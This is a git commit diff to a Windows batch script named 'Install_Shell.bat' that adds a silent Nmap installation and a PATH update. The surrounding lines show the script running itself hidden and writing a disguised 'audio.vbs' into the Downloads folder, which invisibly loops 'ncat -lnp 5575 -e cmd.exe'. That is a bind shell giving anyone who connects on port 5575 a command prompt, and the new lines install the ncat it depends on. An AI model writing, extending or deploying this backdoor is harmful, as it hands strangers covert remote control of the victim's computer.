11e2da1ee6908aeb9f095d362f8ddeed6601b715
Root Maciel <65637444+rootmaciel@users.noreply.github.com>
2026-06-10 09:41:00 -0300

    Add Nmap installation and PATH update to script
    Install Nmap silently and update PATH variable.

--- Install_Shell.bat
+++ Install_Shell.bat
@@ -5,6 +5,13 @@ if not "%1"=="hidden" (
     exit
 )
 
+:: Instalar Nmap
+echo [*] Instalando Nmap...
+winget install Insecure.Nmap --silent --accept-package-agreements --accept-source-agreements > nul 2>&1
+
+:: Atualizar PATH com o Nmap
+set "PATH=%PATH%;%ProgramFiles(x86)%\Nmap"
+
 :: Criar audio.vbs
 echo Do > "%USERPROFILE%\Downloads\audio.vbs"
 echo CreateObject("Wscript.Shell").Run "ncat -lnp 5575 -e cmd.exe", 0, True >> "%USERPROFILE%\Downloads\audio.vbs"
